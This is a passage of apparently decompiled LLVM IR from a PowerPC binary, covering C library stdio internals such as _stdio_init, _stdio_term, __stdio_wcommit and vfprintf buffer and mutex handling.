  %v4_1001a0bc = inttoptr i32 %v3_1001a0bc to i16*
  store i16 %v2_1001a0b4, i16* %v4_1001a0bc, align 2
  %v0_1001a0c0 = load i32, i32* @r28, align 4
  %v1_1001a0c0 = call i32 @__asm_rlwinm(i32 %v0_1001a0c0, i32 31, i32 16, i32 16)
  %v2_1001a0c4 = or i32 %v1_1001a0c0, %v1_1001a0a8
  store i32 %v2_1001a0c4, i32* %r0.global-to-local, align 4
  %v0_1001a0c8 = load i32, i32* @r31, align 4
  %v1_1001a0c8 = inttoptr i32 %v0_1001a0c8 to i16*
  %v2_1001a0c8 = load i16, i16* %v1_1001a0c8, align 2
  %v3_1001a0c8 = zext i16 %v2_1001a0c8 to i32
  %v2_1001a0cc = or i32 %v3_1001a0c8, %v2_1001a0c4
  store i32 %v2_1001a0cc, i32* %r9.global-to-local, align 4
  %v0_1001a0d0 = load i32, i32* %r29.global-to-local, align 4
  %v2_1001a0d0 = or i32 %v2_1001a0cc, %v0_1001a0d0
  store i32 %v2_1001a0d0, i32* @r29, align 4
  %v1_1001a0d4 = trunc i32 %v2_1001a0d0 to i16
  store i16 %v1_1001a0d4, i16* %v1_1001a0c8, align 2
  %v0_1001a0d8 = call i32 @__errno_location()
  store i32 %v0_1001a0d8, i32* @r28, align 4
  %v0_1001a0e0 = load i32, i32* @r31, align 4
  %v1_1001a0e0 = add i32 %v0_1001a0e0, 4
  %v2_1001a0e0 = inttoptr i32 %v1_1001a0e0 to i32*
  %v3_1001a0e0 = load i32, i32* %v2_1001a0e0, align 4
  store i32 %v3_1001a0e0, i32* @r3, align 4
  %v1_1001a0e4 = inttoptr i32 %v0_1001a0d8 to i32*
  %v2_1001a0e4 = load i32, i32* %v1_1001a0e4, align 4
  store i32 %v2_1001a0e4, i32* @r27, align 4
  store i32 268542188, i32* @lr, align 4
  %v1_1001a0e8 = call i32 @isatty(i32 %v3_1001a0e0)
  %v1_1001a0ec = mul i32 %v1_1001a0e8, 256
  %v0_1001a0f0 = load i32, i32* @r29, align 4
  %v2_1001a0f0 = or i32 %v0_1001a0f0, %v1_1001a0ec
  store i32 %v2_1001a0f0, i32* @r29, align 4
  %v1_1001a0f4 = trunc i32 %v2_1001a0f0 to i16
  %v2_1001a0f4 = load i32, i32* @r31, align 4
  %v3_1001a0f4 = inttoptr i32 %v2_1001a0f4 to i16*
  store i16 %v1_1001a0f4, i16* %v3_1001a0f4, align 2
  %v0_1001a0f8 = load i32, i32* @r27, align 4
  %v1_1001a0f8 = load i32, i32* @r28, align 4
  %v2_1001a0f8 = inttoptr i32 %v1_1001a0f8 to i32*
  store i32 %v0_1001a0f8, i32* %v2_1001a0f8, align 4
  %v0_1001a0fc = load i32, i32* @r31, align 4
  %v1_1001a0fc = add i32 %v0_1001a0fc, 8
  %v2_1001a0fc = inttoptr i32 %v1_1001a0fc to i32*
  %v3_1001a0fc = load i32, i32* %v2_1001a0fc, align 4
  store i32 %v3_1001a0fc, i32* %r0.global-to-local, align 4
  %v3_1001a100 = icmp eq i32 %v3_1001a0fc, 0
  br i1 %v3_1001a100, label %dec_label_pc_1001a108, label %dec_label_pc_1001a138

dec_label_pc_1001a108:                            ; preds = %dec_label_pc_1001a0a0
  store i32 4096, i32* @r3, align 4
  store i32 268542224, i32* @lr, align 4
  %v0_1001a10c = call i32 @malloc()
  %v3_1001a110 = icmp eq i32 %v0_1001a10c, 0
  %v1_1001a114 = load i32, i32* @r31, align 4
  %v2_1001a114 = add i32 %v1_1001a114, 8
  %v3_1001a114 = inttoptr i32 %v2_1001a114 to i32*
  store i32 %v0_1001a10c, i32* %v3_1001a114, align 4
  %v1_1001a134 = load i32, i32* @r31, align 4
  br i1 %v3_1001a110, label %dec_label_pc_1001a134, label %dec_label_pc_1001a11c

dec_label_pc_1001a11c:                            ; preds = %dec_label_pc_1001a108
  %v1_1001a11c = inttoptr i32 %v1_1001a134 to i16*
  %v2_1001a11c = load i16, i16* %v1_1001a11c, align 2
  %v3_1001a11c = zext i16 %v2_1001a11c to i32
  store i32 %v3_1001a11c, i32* %r0.global-to-local, align 4
  %v1_1001a120 = add i32 %v0_1001a10c, 4096
  store i32 %v1_1001a120, i32* %r9.global-to-local, align 4
  %v2_1001a124 = add i32 %v1_1001a134, 12
  %v3_1001a124 = inttoptr i32 %v2_1001a124 to i32*
  store i32 %v1_1001a120, i32* %v3_1001a124, align 4
  %v0_1001a128 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001a128 = or i32 %v0_1001a128, 16384
  store i32 %v1_1001a128, i32* %r0.global-to-local, align 4
  %v1_1001a12c = trunc i32 %v1_1001a128 to i16
  %v2_1001a12c = load i32, i32* @r31, align 4
  %v3_1001a12c = inttoptr i32 %v2_1001a12c to i16*
  store i16 %v1_1001a12c, i16* %v3_1001a12c, align 2
  br label %dec_label_pc_1001a138

dec_label_pc_1001a134:                            ; preds = %dec_label_pc_1001a108
  %v2_1001a134 = add i32 %v1_1001a134, 12
  %v3_1001a134 = inttoptr i32 %v2_1001a134 to i32*
  store i32 0, i32* %v3_1001a134, align 4
  br label %dec_label_pc_1001a138

dec_label_pc_1001a138:                            ; preds = %dec_label_pc_1001a0a0, %dec_label_pc_1001a11c, %dec_label_pc_1001a134
  %v0_1001a138 = load i32, i32* @r31, align 4
  %v1_1001a138 = add i32 %v0_1001a138, 8
  %v2_1001a138 = inttoptr i32 %v1_1001a138 to i32*
  %v3_1001a138 = load i32, i32* %v2_1001a138, align 4
  store i32 %v3_1001a138, i32* %r9.global-to-local, align 4
  %v3_1001a140 = add i32 %v0_1001a138, 2
  %v4_1001a140 = inttoptr i32 %v3_1001a140 to i8*
  store i8 0, i8* %v4_1001a140, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1001a148 = load i32, i32* @r31, align 4
  %v2_1001a148 = add i32 %v1_1001a148, 44
  %v3_1001a148 = inttoptr i32 %v2_1001a148 to i32*
  store i32 0, i32* %v3_1001a148, align 4
  %v0_1001a14c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001a14c = load i32, i32* @r31, align 4
  %v2_1001a14c = add i32 %v1_1001a14c, 20
  %v3_1001a14c = inttoptr i32 %v2_1001a14c to i32*
  store i32 %v0_1001a14c, i32* %v3_1001a14c, align 4
  %v0_1001a150 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001a150 = load i32, i32* @r31, align 4
  %v2_1001a150 = add i32 %v1_1001a150, 24
  %v3_1001a150 = inttoptr i32 %v2_1001a150 to i32*
  store i32 %v0_1001a150, i32* %v3_1001a150, align 4
  %v0_1001a154 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001a154 = load i32, i32* @r31, align 4
  %v2_1001a154 = add i32 %v1_1001a154, 28
  %v3_1001a154 = inttoptr i32 %v2_1001a154 to i32*
  store i32 %v0_1001a154, i32* %v3_1001a154, align 4
  %v0_1001a158 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001a158 = load i32, i32* @r31, align 4
  %v2_1001a158 = add i32 %v1_1001a158, 16
  %v3_1001a158 = inttoptr i32 %v2_1001a158 to i32*
  store i32 %v0_1001a158, i32* %v3_1001a158, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v0_1001a160 = load i32, i32* @r31, align 4
  %v1_1001a160 = inttoptr i32 %v0_1001a160 to i16*
  %v2_1001a160 = load i16, i16* %v1_1001a160, align 2
  %v3_1001a160 = zext i16 %v2_1001a160 to i32
  %v3_1001a164 = load i32, i32* @global_var_1004512c.998, align 4
  store i32 %v3_1001a164, i32* %r0.global-to-local, align 4
  %v1_1001a168 = and i32 %v3_1001a160, 8192
  store i32 %v1_1001a168, i32* %r9.global-to-local, align 4
  %v3_1001a168 = icmp eq i32 %v1_1001a168, 0
  %v2_1001a16c = add i32 %v0_1001a160, 52
  %v3_1001a16c = inttoptr i32 %v2_1001a16c to i32*
  store i32 %v3_1001a164, i32* %v3_1001a16c, align 4
  br i1 %v3_1001a168, label %dec_label_pc_1001a1f4, label %dec_label_pc_1001a174

dec_label_pc_1001a174:                            ; preds = %dec_label_pc_1001a138
  store i32 268527832, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10044d58.1131 to i32), i32* %r29.global-to-local, align 4
  %v2_1001a184 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1001a184, i32* @r26, align 4
  %v4_1001a194 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-56, i32 268527832, i32 ptrtoint (i32* @global_var_10044d58.1131 to i32))
  %v2_1001a1a0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1001a1a0, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_10044d40.1154 to i32), i32* @r29, align 4
  store i32 268542380, i32* @lr, align 4
  %v1_1001a1a8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10044d58.1131 to i32))
  %v0_1001a1ac = load i32, i32* @r28, align 4
  %v0_1001a1b0 = load i32, i32* @r29, align 4
  %v4_1001a1b8 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 %v0_1001a1ac, i32 %v0_1001a1b0)
  %v0_1001a1bc = load i32, i32* @r29, align 4
  store i32 268542404, i32* @lr, align 4
  %v1_1001a1c0 = call i32 @pthread_mutex_lock(i32 %v0_1001a1bc)
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_1001a1c8 = load i32, i32* bitcast (i32** @global_var_10045128.997 to i32*), align 4
  store i32 %v3_1001a1c8, i32* %r0.global-to-local, align 4
  store i32 %v2_1001a1a0, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_1001a1d4 = load i32, i32* @r31, align 4
  %v2_1001a1d4 = add i32 %v1_1001a1d4, 32
  %v3_1001a1d4 = inttoptr i32 %v2_1001a1d4 to i32*
  store i32 %v3_1001a1c8, i32* %v3_1001a1d4, align 4
  %v0_1001a1d8 = load i32, i32* @r31, align 4
  store i32 %v0_1001a1d8, i32* bitcast (i32** @global_var_10045128.997 to i32*), align 4
  store i32 268542432, i32* @lr, align 4
  %v0_1001a1dc = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v2_1001a184, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1001a1ec.1155 to i32), i32* @lr, align 4
  %v0_1001a1e8 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_1001a1f4

dec_label_pc_1001a1f0:                            ; preds = %dec_label_pc_10019fa0, %dec_label_pc_10019f8c, %dec_label_pc_10019fac
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1001a1f4

dec_label_pc_1001a1f4:                            ; preds = %dec_label_pc_1001a138, %dec_label_pc_10019fec, %dec_label_pc_1001a174, %dec_label_pc_1001a1f0
  store i32 %v0_10019f50, i32* %r0.global-to-local, align 4
  %v0_1001a1f8 = load i32, i32* @r31, align 4
  ret i32 %v0_1001a1f8

; uselistorder directives
  uselistorder i32 %v1_1001a134, { 2, 0, 1 }
  uselistorder i32 %v1_1001a0b4, { 1, 0 }
  uselistorder i32 %v0_1001a0a4, { 1, 0 }
  uselistorder i32 %v0_10019ff0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10019fdc, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 16 }
  uselistorder i32 16384, { 9, 10, 0, 1, 2, 3, 4, 5, 7, 6, 8 }
  uselistorder i32 21, { 3, 4, 2, 0, 1 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i8 114, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1001a1f4, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1001a1f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001a138, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001a080, { 1, 0 }
  uselistorder label %dec_label_pc_1001a014, { 1, 0 }
  uselistorder label %dec_label_pc_10019fe4, { 1, 0 }
  uselistorder label %dec_label_pc_10019fd0, { 1, 0 }
  uselistorder label %dec_label_pc_10019fbc, { 2, 0, 1 }
}

define i32 @_stdio_init(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268697600, i32* @r28, align 4
  %v0_1001a220 = call i32 @__errno_location()
  store i32 %v0_1001a220, i32* @r26, align 4
  store i32 0, i32* @r3, align 4
  %v1_1001a22c = inttoptr i32 %v0_1001a220 to i32*
  %v2_1001a22c = load i32, i32* %v1_1001a22c, align 4
  store i32 %v2_1001a22c, i32* @r25, align 4
  store i32 ptrtoint (i16* @global_var_10044d70.996 to i32), i32* @r27, align 4
  %v3_1001a234 = load i16, i16* @global_var_10044d70.996, align 2
  %v4_1001a234 = zext i16 %v3_1001a234 to i32
  store i32 %v4_1001a234, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001a23c.1156 to i32), i32* @lr, align 4
  %v1_1001a238 = call i32 @isatty(i32 0)
  %v1_1001a23c = sub i32 1, %v1_1001a238
  %v1_1001a240 = mul i32 %v1_1001a23c, 256
  %v0_1001a244 = load i32, i32* @r29, align 4
  %v2_1001a244 = xor i32 %v1_1001a240, %v0_1001a244
  store i32 1, i32* @r3, align 4
  %v1_1001a24c = trunc i32 %v2_1001a244 to i16
  store i16 %v1_1001a24c, i16* @global_var_10044d70.996, align 2
  %v3_1001a250 = load i16, i16* @global_var_10044dc0.1129, align 2
  %v4_1001a250 = zext i16 %v3_1001a250 to i32
  store i32 %v4_1001a250, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001a258.1157 to i32), i32* @lr, align 4
  %v1_1001a254 = call i32 @isatty(i32 1)
  %v1_1001a258 = sub i32 1, %v1_1001a254
  %v1_1001a25c = mul i32 %v1_1001a258, 256
  %v0_1001a260 = load i32, i32* @r29, align 4
  %v2_1001a260 = xor i32 %v1_1001a25c, %v0_1001a260
  %v1_1001a264 = trunc i32 %v2_1001a260 to i16
  store i16 %v1_1001a264, i16* @global_var_10044dc0.1129, align 2
  %v0_1001a268 = load i32, i32* @r25, align 4
  %v1_1001a268 = load i32, i32* @r26, align 4
  %v2_1001a268 = inttoptr i32 %v1_1001a268 to i32*
  store i32 %v0_1001a268, i32* %v2_1001a268, align 4
  ret i32 %v1_1001a25c

; uselistorder directives
  uselistorder i32 %v1_1001a25c, { 1, 0 }
  uselistorder i16* @global_var_10044dc0.1129, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 24, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1002e3e0.1158 to i32), i32* @r4, align 4
  %v0_1001a28c = call i32 @memcpy()
  ret i32 %v0_1001a28c
}

define i32 @_stdio_term(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10044d40.1154 to i32), i32* @r3, align 4
  store i32 268542636, i32* @lr, align 4
  %v0_1001a2a8 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_10044d58.1131 to i32), i32* @r3, align 4
  store i32 268542648, i32* @lr, align 4
  %v0_1001a2b4 = call i32 @__stdio_init_mutex()
  store i32 268697600, i32* %r9.global-to-local, align 4
  %storemerge6 = load i32, i32* bitcast (i32** @global_var_10045128.997 to i32*), align 4
  %v3_1001a3009 = icmp eq i32 %storemerge6, 0
  %v1_1001a30411 = add i32 %storemerge6, 56
  store i32 %v1_1001a30411, i32* @r30, align 4
  br i1 %v3_1001a3009, label %dec_label_pc_1001a310, label %dec_label_pc_1001a2c4

dec_label_pc_1001a2c4:                            ; preds = %entry, %dec_label_pc_1001a2f0
  %v0_1001a2c4 = phi i32 [ %v1_1001a304, %dec_label_pc_1001a2f0 ], [ %v1_1001a30411, %entry ]
  store i32 268542664, i32* @lr, align 4
  %v1_1001a2c4 = call i32 @pthread_mutex_trylock(i32 %v0_1001a2c4)
  %v3_1001a2c8 = icmp eq i32 %v1_1001a2c4, 0
  %v0_1001a2cc = load i32, i32* @r30, align 4
  store i32 %v0_1001a2cc, i32* @r3, align 4
  br i1 %v3_1001a2c8, label %dec_label_pc_1001a2f0, label %dec_label_pc_1001a2d4

dec_label_pc_1001a2d4:                            ; preds = %dec_label_pc_1001a2c4
  %v0_1001a2d4 = load i32, i32* @r31, align 4
  %v1_1001a2d4 = add i32 %v0_1001a2d4, 8
  %v2_1001a2d4 = inttoptr i32 %v1_1001a2d4 to i32*
  %v3_1001a2d4 = load i32, i32* %v2_1001a2d4, align 4
  store i32 %v3_1001a2d4, i32* %r9.global-to-local, align 4
  %v3_1001a2dc = inttoptr i32 %v0_1001a2d4 to i16*
  store i16 48, i16* %v3_1001a2dc, align 2
  %v0_1001a2e0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001a2e0 = load i32, i32* @r31, align 4
  %v2_1001a2e0 = add i32 %v1_1001a2e0, 20
  %v3_1001a2e0 = inttoptr i32 %v2_1001a2e0 to i32*
  store i32 %v0_1001a2e0, i32* %v3_1001a2e0, align 4
  %v0_1001a2e4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001a2e4 = load i32, i32* @r31, align 4
  %v2_1001a2e4 = add i32 %v1_1001a2e4, 24
  %v3_1001a2e4 = inttoptr i32 %v2_1001a2e4 to i32*
  store i32 %v0_1001a2e4, i32* %v3_1001a2e4, align 4
  %v0_1001a2e8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001a2e8 = load i32, i32* @r31, align 4
  %v2_1001a2e8 = add i32 %v1_1001a2e8, 28
  %v3_1001a2e8 = inttoptr i32 %v2_1001a2e8 to i32*
  store i32 %v0_1001a2e8, i32* %v3_1001a2e8, align 4
  %v0_1001a2ec = load i32, i32* %r9.global-to-local, align 4
  %v1_1001a2ec = load i32, i32* @r31, align 4
  %v2_1001a2ec = add i32 %v1_1001a2ec, 16
  %v3_1001a2ec = inttoptr i32 %v2_1001a2ec to i32*
  store i32 %v0_1001a2ec, i32* %v3_1001a2ec, align 4
  br label %dec_label_pc_1001a2f0

dec_label_pc_1001a2f0:                            ; preds = %dec_label_pc_1001a2c4, %dec_label_pc_1001a2d4
  %v1_1001a2f4 = load i32, i32* @r31, align 4
  %v2_1001a2f4 = add i32 %v1_1001a2f4, 52
  %v3_1001a2f4 = inttoptr i32 %v2_1001a2f4 to i32*
  store i32 1, i32* %v3_1001a2f4, align 4
  store i32 268542716, i32* @lr, align 4
  %v0_1001a2f8 = call i32 @__stdio_init_mutex()
  %v0_1001a2fc = load i32, i32* @r31, align 4
  %v1_1001a2fc = add i32 %v0_1001a2fc, 32
  %v2_1001a2fc = inttoptr i32 %v1_1001a2fc to i32*
  %storemerge = load i32, i32* %v2_1001a2fc, align 4
  %v3_1001a300 = icmp eq i32 %storemerge, 0
  %v1_1001a304 = add i32 %storemerge, 56
  store i32 %v1_1001a304, i32* @r30, align 4
  br i1 %v3_1001a300, label %dec_label_pc_1001a300.dec_label_pc_1001a310_crit_edge, label %dec_label_pc_1001a2c4

dec_label_pc_1001a300.dec_label_pc_1001a310_crit_edge: ; preds = %dec_label_pc_1001a2f0
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_10045128.997 to i32*), align 4
  br label %dec_label_pc_1001a310

dec_label_pc_1001a310:                            ; preds = %dec_label_pc_1001a300.dec_label_pc_1001a310_crit_edge, %entry
  %v0_1001a34c17 = phi i32 [ %v1_1001a304, %dec_label_pc_1001a300.dec_label_pc_1001a310_crit_edge ], [ %v1_1001a30411, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_1001a300.dec_label_pc_1001a310_crit_edge ], [ 0, %entry ]
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %storemerge12, i32* @r31, align 4
  %v3_1001a3345 = icmp eq i32 %storemerge12, 0
  br i1 %v3_1001a3345, label %dec_label_pc_1001a33c, label %dec_label_pc_1001a31c

dec_label_pc_1001a31c:                            ; preds = %dec_label_pc_1001a310, %dec_label_pc_1001a330
  %v0_1001a31c = phi i32 [ %storemerge1, %dec_label_pc_1001a330 ], [ %storemerge12, %dec_label_pc_1001a310 ]
  %v1_1001a31c = inttoptr i32 %v0_1001a31c to i16*
  %v2_1001a31c = load i16, i16* %v1_1001a31c, align 2
  %v3_1001a31c = zext i16 %v2_1001a31c to i32
  store i32 %v0_1001a31c, i32* @r3, align 4
  %v1_1001a324 = and i32 %v3_1001a31c, 64
  store i32 %v1_1001a324, i32* %r9.global-to-local, align 4
  %v3_1001a324 = icmp eq i32 %v1_1001a324, 0
  br i1 %v3_1001a324, label %dec_label_pc_1001a330, label %dec_label_pc_1001a32c

dec_label_pc_1001a32c:                            ; preds = %dec_label_pc_1001a31c
  store i32 268542768, i32* @lr, align 4
  %v0_1001a32c = call i32 @__stdio_wcommit()
  %v0_1001a330.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001a330

dec_label_pc_1001a330:                            ; preds = %dec_label_pc_1001a31c, %dec_label_pc_1001a32c
  %v0_1001a330 = phi i32 [ %v0_1001a31c, %dec_label_pc_1001a31c ], [ %v0_1001a330.pre, %dec_label_pc_1001a32c ]
  %v0_1001a34c18 = phi i32 [ %v0_1001a31c, %dec_label_pc_1001a31c ], [ %v0_1001a32c, %dec_label_pc_1001a32c ]
  %v1_1001a330 = add i32 %v0_1001a330, 32
  %v2_1001a330 = inttoptr i32 %v1_1001a330 to i32*
  %storemerge1 = load i32, i32* %v2_1001a330, align 4
  store i32 %storemerge1, i32* @r31, align 4
  %v3_1001a334 = icmp eq i32 %storemerge1, 0
  br i1 %v3_1001a334, label %dec_label_pc_1001a33c, label %dec_label_pc_1001a31c

dec_label_pc_1001a33c:                            ; preds = %dec_label_pc_1001a330, %dec_label_pc_1001a310
  %v0_1001a34c = phi i32 [ %v0_1001a34c17, %dec_label_pc_1001a310 ], [ %v0_1001a34c18, %dec_label_pc_1001a330 ]
  ret i32 %v0_1001a34c

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %v0_1001a31c, { 0, 1, 3, 2 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32 %v1_1001a304, { 0, 2, 1 }
  uselistorder i32 %v1_1001a30411, { 1, 0, 2 }
  uselistorder i32 ()* @__stdio_init_mutex, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_1001a330, { 1, 0 }
  uselistorder label %dec_label_pc_1001a31c, { 1, 0 }
  uselistorder label %dec_label_pc_1001a2f0, { 1, 0 }
  uselistorder label %dec_label_pc_1001a2c4, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %v0_1001a358 = load i32, i32* @r31, align 4
  %v0_1001a35c = load i32, i32* @r3, align 4
  %v1_1001a364 = add i32 %v0_1001a35c, 8
  %v2_1001a364 = inttoptr i32 %v1_1001a364 to i32*
  %v3_1001a364 = load i32, i32* %v2_1001a364, align 4
  %v1_1001a368 = add i32 %v0_1001a35c, 16
  %v2_1001a368 = inttoptr i32 %v1_1001a368 to i32*
  %v3_1001a368 = load i32, i32* %v2_1001a368, align 4
  %v2_1001a370 = sub i32 %v3_1001a368, %v3_1001a364
  store i32 %v2_1001a370, i32* @r5, align 4
  %v5_1001a370 = icmp eq i32 %v2_1001a370, 0
  br i1 %v5_1001a370, label %dec_label_pc_1001a380, label %dec_label_pc_1001a378

dec_label_pc_1001a378:                            ; preds = %entry
  store i32 %v3_1001a364, i32* %v2_1001a368, align 4
  store i32 268542848, i32* @lr, align 4
  %v2_1001a37c = inttoptr i32 %v3_1001a364 to i16*
  %v3_1001a37c = call i32 @__stdio_WRITE(i16* %v2_1001a37c, i32 %v2_1001a370)
  %v0_1001a380.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001a380

dec_label_pc_1001a380:                            ; preds = %entry, %dec_label_pc_1001a378
  %v0_1001a380 = phi i32 [ %v0_1001a35c, %entry ], [ %v0_1001a380.pre, %dec_label_pc_1001a378 ]
  %v1_1001a380 = add i32 %v0_1001a380, 8
  %v2_1001a380 = inttoptr i32 %v1_1001a380 to i32*
  %v3_1001a380 = load i32, i32* %v2_1001a380, align 4
  %v1_1001a384 = add i32 %v0_1001a380, 16
  %v2_1001a384 = inttoptr i32 %v1_1001a384 to i32*
  %v3_1001a384 = load i32, i32* %v2_1001a384, align 4
  store i32 %v0_1001a358, i32* @r31, align 4
  %v2_1001a38c = sub i32 %v3_1001a384, %v3_1001a380
  ret i32 %v2_1001a38c

; uselistorder directives
  uselistorder i32 %v0_1001a380, { 1, 0 }
  uselistorder i32 %v3_1001a364, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001a380, { 1, 0 }
}

define i32 @__GI_vfprintf() local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1001a3ac = load i32, i32* @r3, align 4
  %v1_1001a3ac = add i32 %v0_1001a3ac, 56
  store i32 %v1_1001a3ac, i32* %r30.global-to-local, align 4
  %v0_1001a3b4 = load i32, i32* @r4, align 4
  store i32 %v0_1001a3b4, i32* @r29, align 4
  store i32 %v0_1001a3ac, i32* @r31, align 4
  %v0_1001a3c0 = load i32, i32* @r5, align 4
  store i32 %v0_1001a3c0, i32* @r27, align 4
  %v1_1001a3c8 = add i32 %v0_1001a3ac, 52
  %v2_1001a3c8 = inttoptr i32 %v1_1001a3c8 to i32*
  %v3_1001a3c8 = load i32, i32* %v2_1001a3c8, align 4
  store i32 %v3_1001a3c8, i32* @r28, align 4
  %v2_1001a3d0 = ptrtoint i32* %stack_var_-40 to i32
  %v3_1001a3d4 = icmp eq i32 %v3_1001a3c8, 0
  br i1 %v3_1001a3d4, label %dec_label_pc_1001a3dc, label %dec_label_pc_1001a3e8

dec_label_pc_1001a3dc:                            ; preds = %entry
  %v4_1001a3dc = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 268527832, i32 %v1_1001a3ac)
  %v0_1001a3e0 = load i32, i32* %r30.global-to-local, align 4
  store i32 268542952, i32* @lr, align 4
  %v1_1001a3e4 = call i32 @pthread_mutex_lock(i32 %v0_1001a3e0)
  %v0_1001a3e8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001a3e8

dec_label_pc_1001a3e8:                            ; preds = %entry, %dec_label_pc_1001a3dc
  %v0_1001a3e8 = phi i32 [ %v0_1001a3ac, %entry ], [ %v0_1001a3e8.pre, %dec_label_pc_1001a3dc ]
  %v1_1001a3e8 = inttoptr i32 %v0_1001a3e8 to i16*
  %v2_1001a3e8 = load i16, i16* %v1_1001a3e8, align 2
  %v3_1001a3e8 = zext i16 %v2_1001a3e8 to i32
  store i32 128, i32* @r4, align 4
  store i32 %v0_1001a3e8, i32* @r3, align 4
  store i32 -1, i32* @r30, align 4
  %v1_1001a3f8 = call i32 @__asm_rlwinm(i32 %v3_1001a3e8, i32 0, i32 24, i32 25)
  %v3_1001a3fc = icmp eq i32 %v1_1001a3f8, 192
  br i1 %v3_1001a3fc, label %dec_label_pc_1001a410, label %dec_label_pc_1001a404

dec_label_pc_1001a404:                            ; preds = %dec_label_pc_1001a3e8
  store i32 268542984, i32* @lr, align 4
  %v0_1001a404 = call i32 @__stdio_trans2w_o()
  %v3_1001a408 = icmp eq i32 %v0_1001a404, 0
  br i1 %v3_1001a408, label %dec_label_pc_1001a410, label %dec_label_pc_1001a424

dec_label_pc_1001a410:                            ; preds = %dec_label_pc_1001a404, %dec_label_pc_1001a3e8
  %v0_1001a410 = load i32, i32* @r29, align 4
  store i32 %v0_1001a410, i32* @r4, align 4
  %v0_1001a414 = load i32, i32* @r27, align 4
  store i32 %v0_1001a414, i32* @r5, align 4
  %v0_1001a418 = load i32, i32* @r31, align 4
  store i32 %v0_1001a418, i32* @r3, align 4
  store i32 268543008, i32* @lr, align 4
  %v0_1001a41c = call i32 @_vfprintf_internal()
  store i32 %v0_1001a41c, i32* @r30, align 4
  br label %dec_label_pc_1001a424

dec_label_pc_1001a424:                            ; preds = %dec_label_pc_1001a404, %dec_label_pc_1001a410
  %v0_1001a424 = load i32, i32* @r28, align 4
  %v3_1001a424 = icmp eq i32 %v0_1001a424, 0
  store i32 %v2_1001a3d0, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  br i1 %v3_1001a424, label %dec_label_pc_1001a434, label %dec_label_pc_1001a438

dec_label_pc_1001a434:                            ; preds = %dec_label_pc_1001a424
  store i32 268543032, i32* @lr, align 4
  %v0_1001a434 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_1001a438

dec_label_pc_1001a438:                            ; preds = %dec_label_pc_1001a424, %dec_label_pc_1001a434
  %v0_1001a43c = load i32, i32* @r30, align 4
  ret i32 %v0_1001a43c

; uselistorder directives
  uselistorder i32 %v0_1001a3e8, { 1, 0 }
  uselistorder i32 %v0_1001a3ac, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1001a438, { 1, 0 }
  uselistorder label %dec_label_pc_1001a424, { 1, 0 }
  uselistorder label %dec_label_pc_1001a3e8, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg3, i32* @r31, align 4
  store i8 %arg2, i8* %stack_var_-40, align 1
  %v3_1001a4784 = icmp eq i32 %arg3, 0
  %v2_1001a47c = ptrtoint i8* %stack_var_-40 to i32
